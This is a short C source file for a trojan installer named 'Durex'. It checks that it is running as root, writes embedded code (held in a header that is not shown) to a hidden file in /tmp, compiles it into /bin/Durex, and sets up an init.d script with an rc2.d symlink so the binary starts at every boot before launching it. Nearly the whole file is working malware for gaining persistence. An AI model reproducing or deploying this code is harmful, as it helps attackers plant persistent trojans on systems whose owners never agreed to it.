#include "durex.h"

int create_trojan()
{
	int fd;

	if ((fd = open("/tmp/.compyle.c", O_RDWR | O_CREAT | O_TRUNC)) < 0 )
		return (1);
	write(fd, code, sizeof(code) - 1);
	system("gcc /tmp/.compyle.c -o /bin/Durex; rm -f /tmp/.compyle");
	return (0);
}

int main()
{
	uid_t id = getuid(); 
	if (id)//check if launched as root
		return (1);
	puts("sel-melc");
	if (create_trojan())
		return (1);
	//make it launch at each boot
	system("echo \"#!/bin/bash\n/bin/Durex \" > /etc/init.d/durex; chmod 755 /etc/init.d/durex; ln -s /etc/init.d/durex /etc/rc2.d/S99durex 2&>/dev/null");
	system("/bin/Durex");
	return (0);
}